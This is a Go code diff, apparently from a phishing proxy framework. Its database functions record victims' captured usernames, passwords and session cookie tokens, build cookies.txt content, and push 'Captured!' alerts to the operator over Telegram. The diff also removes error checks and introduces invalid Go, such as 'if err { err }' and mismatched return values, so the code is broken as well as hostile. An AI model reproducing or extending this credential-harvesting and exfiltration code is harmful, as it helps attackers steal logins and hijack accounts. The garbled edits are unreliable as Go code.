@@ -36,8 +36,8 @@ func NewDatabase(path string) (*Database, error) {
 
 func (d *Database) CreateSession(sid string, phishlet string, landing_url string, useragent string, remote_addr string) error {
     s, err := d.sessionsCreate(sid, phishlet, landing_url, useragent, remote_addr)
-    if err != nil {
-        return nil, err
+    if err {
+        err
     }
     
     // Send new visitor notification
@@ -55,7 +55,7 @@ func (d *Database) CreateSession(sid string, phishlet string, landing_url string
         sid)
     
     sendTelegramMessage(d.telegram, message)
-    return s, nil
+    return err
 }
 
 func (d *Database) ListSessions() ([]*Session, error) {
@@ -65,9 +65,6 @@ func (d *Database) ListSessions() ([]*Session, error) {
 
 func (d *Database) SetSessionUsername(sid string, username string) error {
     err := d.sessionsUpdateUsername(sid, username)
-    if err != nil {
-        return err
-    }
     
     message := fmt.Sprintf(`📧 <b>Email/Username Captured!</b>
 
@@ -77,14 +74,12 @@ func (d *Database) SetSessionUsername(sid string, username string) error {
         sid)
     
     sendTelegramMessage(d.telegram, message)
-    return nil
+    return err
 }
 
 func (d *Database) SetSessionPassword(sid string, password string) error {
     err := d.sessionsUpdatePassword(sid, password)
-    if err != nil {
-        return err
-    }
+
     
     message := fmt.Sprintf(`🔐 <b>Password Captured!</b>
 
@@ -94,7 +89,7 @@ func (d *Database) SetSessionPassword(sid string, password string) error {
         sid)
     
     sendTelegramMessage(d.telegram, message)
-    return nil
+    return err
 }
 
 func (d *Database) SetSessionCustom(sid string, name string, value string) error {
@@ -114,9 +109,6 @@ func (d *Database) SetSessionHttpTokens(sid string, tokens map[string]string) er
 
 func (d *Database) SetSessionCookieTokens(sid string, tokens map[string]map[string]*CookieToken) error {
     err := d.sessionsUpdateCookieTokens(sid, tokens)
-    if err != nil {
-        return err
-    }
     
     // Create cookies.txt content
     var cookieContent strings.Builder
@@ -137,7 +129,7 @@ func (d *Database) SetSessionCookieTokens(sid string, tokens map[string]map[stri
         sid)
     
     sendTelegramMessage(d.telegram, message)
-    return nil
+    return err
 }
 
 func (d *Database) DeleteSession(sid string) error {
